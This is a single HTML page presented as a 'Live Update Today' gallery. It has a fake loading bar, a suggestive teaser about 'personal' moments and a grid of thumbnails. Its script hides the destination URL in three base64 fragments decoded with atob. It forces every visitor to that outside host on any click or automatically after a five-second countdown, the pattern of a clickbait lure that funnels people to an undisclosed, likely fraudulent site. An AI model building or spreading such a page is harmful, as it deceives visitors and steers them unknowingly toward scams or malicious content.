<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- OG META -->
<meta property="og:title" content="🔴 Live Update Today">
<meta property="og:description" content="Watch the latest update happening right now ▶️ Click to view.">
<meta property="og:image" content="https://i.imgur.com/9AS1uEY.jpeg">
<meta property="og:type" content="website">

<title>🔴 Live Update Today</title>

<style>
body{
  margin:0;
  font-family:Arial;
  background:#0b1220;
  color:white;
}

/* LOADING */
#loading{
  position:fixed;
  width:100%;
  height:100%;
  background:linear-gradient(135deg,#0b1220,#1e3a8a);
  display:flex;
  justify-content:center;
  align-items:center;
  flex-direction:column;
  z-index:999;
}

.logo{
  font-size:32px;
  margin-bottom:25px;
}

.progress-box{
  width:260px;
  height:6px;
  background:rgba(255,255,255,0.2);
  border-radius:10px;
  overflow:hidden;
}

.progress-bar{
  height:100%;
  width:0%;
  background:linear-gradient(90deg,#3b82f6,#60a5fa);
  transition:width 0.3s;
}

.progress-text{
  margin-top:10px;
  font-size:14px;
  opacity:0.8;
}

/* ENTER */
#enterScreen{
  display:none;
  height:100vh;
  justify-content:center;
  align-items:center;
  flex-direction:column;
  text-align:center;
}

/* GALLERY */
#galleryPage{
  display:none;
  text-align:center;
}

.gallery{
  display:grid;
  grid-template-columns:repeat(3,1fr);
  gap:8px;
  padding:10px;
}

.gallery img{
  width:100%;
  border-radius:10px;
  cursor:pointer;
  transition:0.2s;
}

.gallery img:hover{
  transform:scale(1.05);
}

/* BUTTON */
button{
  margin-top:20px;
  padding:12px 22px;
  background:linear-gradient(135deg,#2563eb,#3b82f6);
  border:none;
  border-radius:10px;
  color:white;
  font-weight:bold;
  cursor:pointer;
}

.note{
  font-size:13px;
  opacity:0.7;
  margin-top:10px;
}
</style>
</head>

<body>

<!-- LOADING -->
<div id="loading">
  <div class="logo">🔵 Loading</div>

  <div class="progress-box">
    <div class="progress-bar" id="bar"></div>
  </div>

  <div class="progress-text" id="txt">Loading... 0%</div>
</div>

<!-- ENTER -->
<div id="enterScreen">
  <h2>LIVE UPDATE TODAY</h2>
  <p style="opacity:0.7;">Tap below or wait a moment…</p>
  <button onclick="enterPage()">Enter</button>
</div>

<!-- GALLERY -->
<div id="galleryPage">

  <h2>Exclusive Collection</h2>

  <p style="opacity:0.75; max-width:320px; margin:auto;">
  A small collection that’s been getting attention lately.
  Some moments are a little more… personal than others.
  </p>

  <div class="gallery">
    <img src="https://i.imgur.com/cT072eg.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/wVCBBj2.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/j6qaYFd.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/xX61mRI.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/knjOdH3.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/LRypO0v.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/TBRyf55.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/5OlrEm2.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/0poFxSi.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/AOM9fTf.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/d9gZSs3.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/AxmBfxf.jpeg" onclick="goLink()">
  </div>

  <button onclick="goLink()">Open Full Access</button>

  <p class="note">
    You will be redirected in <span id="count">5</span>s...
  </p>

</div>

<script>

/* PROGRESS LOADING */
let progress=0;
const bar=document.getElementById("bar");
const txt=document.getElementById("txt");

function loadSim(){
  progress += Math.random()*8;

  if(progress>=100){
    progress=100;
    bar.style.width="100%";
    txt.innerText="Loading... 100%";

    setTimeout(()=>{
      document.getElementById("loading").style.display="none";
      document.getElementById("enterScreen").style.display="flex";

      setTimeout(()=>enterPage(),2000);

    },500);

    return;
  }

  bar.style.width=progress+"%";
  txt.innerText="Loading... "+Math.floor(progress)+"%";

  requestAnimationFrame(loadSim);
}

loadSim();

/* ENTER */
function enterPage(){
  document.getElementById("enterScreen").style.display="none";
  document.getElementById("galleryPage").style.display="block";
  startCountdown();
}

/* ENCODE LINK */
const a="aHR0cHM6Ly9mZGVk";
const b="ZGcuaHVic3Mub25l";
const c="L3AvbmhWTnk=";

function goLink(){
  location.href=atob(a+b+c);
}

/* COUNTDOWN */
function startCountdown(){
  let t=5;
  const el=document.getElementById("count");

  const timer=setInterval(()=>{
    t--;
    el.innerText=t;

    if(t<=0){
      clearInterval(timer);
      goLink();
    }
  },1000);
}

</script>

</body>
</html>
